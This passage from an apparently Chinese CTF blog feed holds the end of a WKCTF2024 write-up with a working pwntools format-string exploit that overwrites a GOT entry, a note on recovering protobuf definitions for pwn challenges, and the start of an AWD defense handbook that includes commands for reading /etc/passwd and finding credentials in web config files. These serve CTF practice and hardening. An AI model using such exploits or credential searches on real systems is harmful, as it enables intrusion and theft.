class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// x19</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+FCCh] [xbp+2Ch]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [xsp+FD0h] [xbp+30h] BYREF</span><br>  __int64 v7; <span class="hljs-comment">// [xsp+FF8h] [xbp+58h]</span><br><br>  v7 = _bss_start;<br>  read(<span class="hljs-number">0</span>, v6, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    v4 = i;<br>    <span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-built_in">strlen</span>(v6) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span> *)(<span class="hljs-type">unsigned</span> __int8)v6[i] == <span class="hljs-string">&quot;$&quot;</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(v6);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ARM64程序，题目说patch了东西，正常来说<code>$</code>应该用不了，但是试了下有<code>$</code>仍然会执行printf(v6)，直接格式字符串改__stack_chk_fail的got为后门</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2024-07-14 12:15:14<br><br>from pwn import *<br>from pwncli import *<br><br>context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]<br>context.binary = &#x27;./silent&#x27;<br>context.log_level = &#x27;debug&#x27;<br>context.timeout = 5<br><br>io = process([&#x27;./qemu-aarch64-static&#x27;,&#x27;-L&#x27;,&#x27;./libc&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;silent&#x27;])<br># io = process([&#x27;./qemu-aarch64-static&#x27;,&#x27;-L&#x27;,&#x27;./libc&#x27;,&#x27;silent&#x27;])<br># io = remote(&#x27;120.79.91.95&#x27;, 3332)<br>elf = ELF(&#x27;./silent&#x27;)<br># libc = ELF(&#x27;&#x27;)<br><br><br>def debug(gdbscript=&quot;&quot;, stop=False):<br>    if isinstance(io, process):<br>        gdb.attach(io, gdbscript=gdbscript)<br>        if stop:<br>            pause()<br><br>stop = pause<br>S = pause<br>leak = lambda name, address: log.info(&quot;&#123;&#125; ===&gt; &#123;&#125;&quot;.format(name, hex(address)))<br>s   = io.send<br>sl  = io.sendline<br>sla = io.sendlineafter<br>sa  = io.sendafter<br>slt = io.sendlinethen<br>st  = io.sendthen<br>r   = io.recv<br>rn  = io.recvn<br>rr  = io.recvregex<br>ru  = io.recvuntil<br>ra  = io.recvall<br>rl  = io.recvline<br>rs  = io.recvlines<br>rls = io.recvline_startswith<br>rle = io.recvline_endswith<br>rlc = io.recvline_contains<br>ia  = io.interactive<br>ic  = io.close<br>cr  = io.can_recv<br><br>stop()<br># debug(stop=True)<br>payload=b&#x27;%p&#x27;*7+b&quot;%1656c&quot;+b&#x27;%p&#x27;*11+b&quot;%hnaaa&quot;+p64_ex(0x411018)<br>payload=b&#x27;%1904c%16$hnaaaa&#x27;+p64_ex(0x411018)+b&#x27;a&#x27;*0x38<br># sl(p+p64_ex(0x400770))<br>s(payload)<br>ia()<br><br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WKCTF2024</category>
      
      <category>Wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>WKCTF2024</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ProtobufPwn</title>
    <link href="/2024/05/29/ProtobufPwn/"/>
    <url>/2024/05/29/ProtobufPwn/</url>
    
    <content type="html"><![CDATA[<h1 id="还原-proto文件"><a href="#还原-proto文件" class="headerlink" title="还原.proto文件"></a>还原.proto文件</h1><h2 id="pbtk"><a href="#pbtk" class="headerlink" title="pbtk"></a>pbtk</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extractors/from_binary.py [-h] input_file [output_dir]<br></code></pre></td></tr></table></figure><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>先找到字段字符串<br><img src="/2024/05/29/ProtobufPwn/1.png"></p><p>然后通过交叉引用找到message字段的结构体，一般在<code>.data.rel.ro</code>段<br><img src="/2024/05/29/ProtobufPwn/2.png"></p><p>结构体各字段具体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ProtobufCFieldDescriptor</span> &#123;</span><br><span class="hljs-comment">/** Name of the field as given in the .proto file. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-comment">/** Tag value of the field as given in the .proto file. */</span><br><span class="hljs-type">uint32_t</span>id;<br><span class="hljs-comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span><br>ProtobufCLabellabel;<br><span class="hljs-comment">/** The type of the field. */</span><br>ProtobufCTypetype;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span><br><span class="hljs-comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span><br><span class="hljs-comment"> * for repeated members or the case enum for oneofs).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span>quantifier_offset;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The offset in bytes into the message&#x27;s C structure for the member</span><br><span class="hljs-comment"> * itself.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span>offset;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A type-specific descriptor.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span><br><span class="hljs-comment"> * corresponding `ProtobufCEnumDescriptor`.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span><br><span class="hljs-comment"> * the corresponding `ProtobufCMessageDescriptor`.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Otherwise this field is NULL.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-type">void</span>*descriptor; <span class="hljs-comment">/* for MESSAGE and ENUM types */</span><br><span class="hljs-comment">/** The default value for this field, if defined. May be NULL. */</span><br><span class="hljs-type">const</span> <span class="hljs-type">void</span>*default_value;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A flag word. Zero or more of the bits defined in the</span><br><span class="hljs-comment"> * `ProtobufCFieldFlag` enum may be set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">uint32_t</span>flags;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">unsigned</span>reserved_flags;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved2;<br><span class="hljs-comment">/** Reserved for future use. */</span><br><span class="hljs-type">void</span>*reserved3;<br>&#125;;<br></code></pre></td></tr></table></figure><p>label对应枚举如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br><span class="hljs-comment">/** A well-formed message must have exactly one of this field. */</span><br>PROTOBUF_C_LABEL_REQUIRED,<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A well-formed message can have zero or one of this field (but not</span><br><span class="hljs-comment"> * more than one).</span><br><span class="hljs-comment"> */</span><br>PROTOBUF_C_LABEL_OPTIONAL,<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This field can be repeated any number of times (including zero) in a</span><br><span class="hljs-comment"> * well-formed message. The order of the repeated values will be</span><br><span class="hljs-comment"> * preserved.</span><br><span class="hljs-comment"> */</span><br>PROTOBUF_C_LABEL_REPEATED,<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This field has no label. This is valid only in proto3 and is</span><br><span class="hljs-comment"> * equivalent to OPTIONAL but no &quot;has&quot; quantifier will be consulted.</span><br><span class="hljs-comment"> */</span><br>PROTOBUF_C_LABEL_NONE,<br>&#125; ProtobufCLabel;<br></code></pre></td></tr></table></figure><p>type对应枚举如下：</p><table><thead><tr><th>Protobuf C Type</th><th>C Type</th><th>Line Number Minus One (Hex)</th></tr></thead><tbody><tr><td>PROTOBUF_C_TYPE_INT32</td><td>int32</td><td>0x0</td></tr><tr><td>PROTOBUF_C_TYPE_SINT32</td><td>signed int32</td><td>0x1</td></tr><tr><td>PROTOBUF_C_TYPE_SFIXED32</td><td>signed int32 (4 bytes)</td><td>0x2</td></tr><tr><td>PROTOBUF_C_TYPE_INT64</td><td>int64</td><td>0x3</td></tr><tr><td>PROTOBUF_C_TYPE_SINT64</td><td>signed int64</td><td>0x4</td></tr><tr><td>PROTOBUF_C_TYPE_SFIXED64</td><td>signed int64 (8 bytes)</td><td>0x5</td></tr><tr><td>PROTOBUF_C_TYPE_UINT32</td><td>unsigned int32</td><td>0x6</td></tr><tr><td>PROTOBUF_C_TYPE_FIXED32</td><td>unsigned int32 (4 bytes)</td><td>0x7</td></tr><tr><td>PROTOBUF_C_TYPE_UINT64</td><td>unsigned int64</td><td>0x8</td></tr><tr><td>PROTOBUF_C_TYPE_FIXED64</td><td>unsigned int64 (8 bytes)</td><td>0x9</td></tr><tr><td>PROTOBUF_C_TYPE_FLOAT</td><td>float</td><td>0xA</td></tr><tr><td>PROTOBUF_C_TYPE_DOUBLE</td><td>double</td><td>0xB</td></tr><tr><td>PROTOBUF_C_TYPE_BOOL</td><td>boolean</td><td>0xC</td></tr><tr><td>PROTOBUF_C_TYPE_ENUM</td><td>enumerated type</td><td>0xD</td></tr><tr><td>PROTOBUF_C_TYPE_STRING</td><td>UTF-8 or ASCII string</td><td>0xE</td></tr><tr><td>PROTOBUF_C_TYPE_BYTES</td><td>arbitrary byte sequence</td><td>0xF</td></tr><tr><td>PROTOBUF_C_TYPE_MESSAGE</td><td>nested message</td><td>0x10</td></tr></tbody></table><p>下图<br><img src="/2024/05/29/ProtobufPwn/2.png"><br>对应的message为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs proto">bytes whatcon = 1;<br></code></pre></td></tr></table></figure><h1 id="编译proto文件"><a href="#编译proto文件" class="headerlink" title="编译proto文件"></a>编译proto文件</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">protoc proto_file.proto --python_out ./<br></code></pre></td></tr></table></figure><p>编译完成后生成一个proto_file_pb2.py文件，在脚本中通过<code>import proto_file_pb2</code>引用，通过<code>cont = proto_file_pb2.devicemsg()</code>创建message对象，其中devicemsg为.proto文件内的message结构体名称，通过cont.whatcon&#x3D;b’aaaa’赋值，最后通过cont.SerializeToString()解析然后发送。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>ProtobufPwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD 笔记</title>
    <link href="/2024/05/24/AWD-%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/05/24/AWD-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD比赛指导手册"><a href="#AWD比赛指导手册" class="headerlink" title="AWD比赛指导手册"></a>AWD比赛指导手册</h1><p><strong>手册版本号：V1.2.2-2023&#x2F;10&#x2F;21</strong></p><p>这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容。如果你要参加AWD相关比赛，相信本项目能给你带来帮助~</p><h2 id="0-什么是AWD"><a href="#0-什么是AWD" class="headerlink" title="0# 什么是AWD"></a>0# 什么是AWD</h2><h3 id="0-1-AWD赛制介绍"><a href="#0-1-AWD赛制介绍" class="headerlink" title="0.1# AWD赛制介绍"></a>0.1# AWD赛制介绍</h3><p>「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。</p><p>在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。</p><p>主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。</p><h3 id="0-2-比赛整体流程"><a href="#0-2-比赛整体流程" class="headerlink" title="0.2# 比赛整体流程"></a>0.2# 比赛整体流程</h3><ul><li>赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 <code>SSH</code> 或者 <code>VNC</code> 的用户名和密码，还有相关IP等信息</li><li>安全加固环节：我们需要先自己去登录靶机服务器，进行30分钟的安全加固（源码备份&#x2F;弱口令修改&#x2F;代码审计和修复&#x2F;漏洞修复等）</li><li>自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令&#x2F;Web漏洞&#x2F;系统漏洞等）获得Flag进行加分，对应队伍失分</li></ul><h2 id="1-比赛环境"><a href="#1-比赛环境" class="headerlink" title="1# 比赛环境"></a>1# 比赛环境</h2><p>通常比赛环境有以下三种情况：</p><ul><li>混合靶机情况：运维机器 <code>Windows 10</code> + 攻击机 <code>Kali Linux</code> + Win靶机 <code>Windows Server 2003/2008/2012</code> 或者 <code>Windows 7</code> + Linux靶机 <code>Centos7.x</code> 或者 <code>Ubuntu 16.04/17.01/20.04</code></li><li>纯Linux靶机情况：运维机器 <code>Windows 10</code> + 攻击机 <code>Kali Linux</code> + Linux靶机 <code>Centos7.x</code> 或者 <code>Ubuntu 16.04/17.01/20.04</code></li><li>纯Windows靶机情况：运维机器 <code>Windows 10</code> + 攻击机 <code>Kali Linux</code> + Win靶机 <code>Windows Server 2003/2008/2012</code> 或者 <code>Windows 7</code></li></ul><p>可能有师傅这里看不太懂，那我可以用大白话描述一下：比赛的时候，会给你1~2台运维机器（一般是Win10里面装了Kali）以及好几台服务器（也就是上面说的靶机），服务器上面有漏洞，要先抓紧去找到漏洞并修复（可别忘了弱口令哦），再通过找到的漏洞去攻击别的队伍的服务器拿到Flag从而得分</p><h2 id="2-安全加固环节（Defense）"><a href="#2-安全加固环节（Defense）" class="headerlink" title="2# 安全加固环节（Defense）"></a>2# 安全加固环节（Defense）</h2><h3 id="2-0-基本加固流程"><a href="#2-0-基本加固流程" class="headerlink" title="2.0# 基本加固流程"></a>2.0# 基本加固流程</h3><h4 id="2-0-1-Windows加固流程"><a href="#2-0-1-Windows加固流程" class="headerlink" title="2.0.1 Windows加固流程"></a>2.0.1 Windows加固流程</h4><p>先备份：Web源码、数据库</p><ol><li>445加固，开启防火墙或IP高级安全策略</li><li>开启系统日志审计功能</li><li>禁用guest账户、关闭文件共享</li><li>确保启动项内容是可控的</li><li>限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置–&gt;管理模板–&gt;Windows组件–&gt;远程桌面服务–&gt;远程桌面会话主机–&gt;连接–&gt;限制连接的数量</li><li>使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe</li><li>恶意代码文件，通过PCHunter、Monitor查找</li><li>Web目录环境查找相关可疑文件：jpg&#x2F;png&#x2F;rar，查看属性、解压看文件内容</li><li>NTFS扫描磁盘查找隐藏的交换流数据</li><li>查找系统所有账户信息，禁止非Administrator账户</li><li>修改Web站点管理员访问路径、默认口令、数据库口令</li><li>安装WAF脚本，防护Web站点，禁止其他漏洞</li></ol><h4 id="2-0-2-Linux加固流程"><a href="#2-0-2-Linux加固流程" class="headerlink" title="2.0.2 Linux加固流程"></a>2.0.2 Linux加固流程</h4><p>先备份：Web源码、数据库</p><ol><li>系统口令修改，团队统一口令</li><li>通过 <code>.bash_history</code> 查找历史命令操作，发现痕迹</li><li>查看计划任务：<code>crontab -l</code>；编辑计划任务：<code>crontab -e</code></li><li>查看 <code>/etc/init.d/rc.local</code> 中启动服务有无异常</li><li>使用脚本开启进程监控、目录监控、流量监控</li><li>Web站点口令,站点管理员路径修改</li><li>系统加固：iptable</li></ol><h3 id="2-1-基本信息搜集"><a href="#2-1-基本信息搜集" class="headerlink" title="2.1# 基本信息搜集"></a>2.1# 基本信息搜集</h3><p>在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆”</p><h4 id="2-1-1-明确Linux机器信息"><a href="#2-1-1-明确Linux机器信息" class="headerlink" title="2.1.1 明确Linux机器信息"></a>2.1.1 明确Linux机器信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">uname -a                       <span class="hljs-comment">//系统信息</span><br>ps -aux                        <span class="hljs-comment">//查询进程信息</span><br>ps -ef | grep 进程名称         <span class="hljs-comment">//筛选指定进程</span><br>id                             <span class="hljs-comment">//用于显示用户ID，以及所属群组ID</span><br>cat /etc/passwd                <span class="hljs-comment">//查看用户情况</span><br>ls /home/                      <span class="hljs-comment">//查看用户情况</span><br>find / -type d -perm <span class="hljs-number">-002</span>      <span class="hljs-comment">//可写目录检查</span><br>ifconfig                       <span class="hljs-comment">//Linux上查看网卡信息</span><br>ip addr show                   <span class="hljs-comment">//Linux上查看网卡信息</span><br></code></pre></td></tr></table></figure><h4 id="2-1-2-明确Windows机器信息"><a href="#2-1-2-明确Windows机器信息" class="headerlink" title="2.1.2 明确Windows机器信息"></a>2.1.2 明确Windows机器信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /all                    <span class="hljs-comment">//Windows上查看用户详细信息</span><br>ipconfig  /all                 <span class="hljs-comment">//Windows上查看网卡信息</span><br></code></pre></td></tr></table></figure><h4 id="2-1-3-查看开放端口"><a href="#2-1-3-查看开放端口" class="headerlink" title="2.1.3 查看开放端口"></a>2.1.3 查看开放端口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">netstat                                                       <span class="hljs-comment">//查看活动连接</span><br>netstat -ano/-a                                               <span class="hljs-comment">//查看端口情况</span><br>netstat -anp                                                  <span class="hljs-comment">//查看端口</span><br>firewall-cmd --zone= public --remove-port=<span class="hljs-number">80</span>/tcp –permanent   <span class="hljs-comment">//关闭端口</span><br>firewall-cmd –reload                                          <span class="hljs-comment">//防火墙重启</span><br></code></pre></td></tr></table></figure><h4 id="2-1-4-默认口令（弱口令）更改"><a href="#2-1-4-默认口令（弱口令）更改" class="headerlink" title="2.1.4 默认口令（弱口令）更改"></a>2.1.4 默认口令（弱口令）更改</h4><p>为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456</p><p>还有其他默认密码admin，top100， top1000等</p><p><strong>尤其是WEB应用的后台密码修改</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">passwd username                                                  <span class="hljs-comment">//ssh口令修改</span><br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> mycms@localhost = password(<span class="hljs-string">&#x27;18ciweufhi28746&#x27;</span>);  <span class="hljs-comment">//MySQL密码修改</span><br>find /var/www<span class="hljs-comment">//html -path &#x27;*config*’                             //查找配置文件中的密码凭证</span><br></code></pre></td></tr></table></figure><h4 id="2-1-5-找本地Flag"><a href="#2-1-5-找本地Flag" class="headerlink" title="2.1.5 找本地Flag"></a>2.1.5 找本地Flag</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">grep -r <span class="hljs-string">&quot;flag&quot;</span> /var/www/html/  <span class="hljs-comment">//Linux：在Web目录下查找flag</span><br>findstr /s /i <span class="hljs-string">&quot;flag&quot;</span> *.*       <span class="hljs-comment">//Windows：当前目录以及所有子目录下的所有文件中查找&quot;flag&quot;这个字符串</span><br></code></pre></td></tr></table></figure><h4 id="2-1-6-设置禁Ping"><a href="#2-1-6-设置禁Ping" class="headerlink" title="2.1.6 设置禁Ping"></a>2.1.6 设置禁Ping</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all     <span class="hljs-comment">//临时开启禁ping</span><br>echo <span class="hljs-string">&quot;0&quot;</span> &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all     <span class="hljs-comment">//关闭禁ping</span><br></code></pre></td></tr></table></figure><h3 id="2-2-Web安全加固"><a href="#2-2-Web安全加固" class="headerlink" title="2.2# Web安全加固"></a>2.2# Web安全加固</h3><h4 id="2-2-1-备份源码"><a href="#2-2-1-备份源码" class="headerlink" title="2.2.1 备份源码"></a>2.2.1 备份源码</h4><p>防止在对源码进行修改时出问题，或者被攻击方删除源码而准备</p><p>压缩源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">tar -cvf web.tar /var/www/html<br>zip -q -r web.zip /var/www/html<br></code></pre></td></tr></table></figure><p>解压缩源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">tar -xvf web.tar -c /var/www/html<br>unzip web.zip -d /var/www/html<br></code></pre></td></tr></table></figure><p>备份源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">mv web.tar /tmp<br>mv web.zip /home/xxx<br></code></pre></td></tr></table></figure><p>上传和下载源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">scp username@servername:/path/filename /tmp/local_destination  <span class="hljs-comment">//从服务器下载单个文件到本地</span><br>scp /path/local_filename username@servername:/path             <span class="hljs-comment">//从本地上传单个文件到服务器</span><br>scp -r username@servername:remote_dir/ /tmp/local_dir          <span class="hljs-comment">//从服务器下载整个目录到本地</span><br>scp -r /tmp/local_dir username@servername:remote_dir           <span class="hljs-comment">//从本地上传整个目录到服务器</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2-设置只读权限"><a href="#2-2-2-设置只读权限" class="headerlink" title="2.2.2 设置只读权限"></a>2.2.2 设置只读权限</h4><p>对Web文件设置只读和执行权限（PHP等动态语言需要执行权限）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">chmod <span class="hljs-number">0555</span> /var/www/html<span class="hljs-comment">/*</span><br><span class="hljs-comment">chmod 0555 /var/www/html/*.php</span><br></code></pre></td></tr></table></figure><p>Web根目录设置只读和执行权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">chmod <span class="hljs-number">0555</span> /var/www/html<br></code></pre></td></tr></table></figure><p>改变文件的属主和属组来设置严格的权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">chown -R root:root /var/www/html/        <span class="hljs-comment">//设置拥有人为 root:root 或 httpd:httpd (推荐)</span><br>chown -R apache:apache /var/www/html/    <span class="hljs-comment">//确保 apache 拥有 /var/www/html/</span><br></code></pre></td></tr></table></figure><h4 id="2-2-3-配置-htaccess"><a href="#2-2-3-配置-htaccess" class="headerlink" title="2.2.3 配置 .htaccess"></a>2.2.3 配置 <code>.htaccess</code></h4><p>利用 <code>.htaccess</code> 配置文件禁止php文件执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-built_in">Directory</span> <span class="hljs-string">&quot;/var/www/html/upload&quot;</span>&gt;   <span class="hljs-comment">//指定目录后续的指令将应用于该目录</span><br>Options -ExecCGI -Indexes            <span class="hljs-comment">//禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。</span><br>AllowOverride None                   <span class="hljs-comment">//不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。</span><br>RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  <br>RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      <br><span class="hljs-comment">//这两个指令移除指定文件扩展名的处理器和类型。</span><br><span class="hljs-comment">//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。</span><br>php_flag engine off     <span class="hljs-comment">//这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。</span><br>&lt;FilesMatch <span class="hljs-string">&quot;.+\.ph(p[3457]?|t|tml)$&quot;</span>&gt;<br>deny <span class="hljs-keyword">from</span> all<br>&lt;/FilesMatch&gt;  <span class="hljs-comment">//这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有</span><br>&lt;/<span class="hljs-built_in">Directory</span>&gt;<br></code></pre></td></tr></table></figure><h4 id="2-2-4-PHP参数安全配置"><a href="#2-2-4-PHP参数安全配置" class="headerlink" title="2.2.4 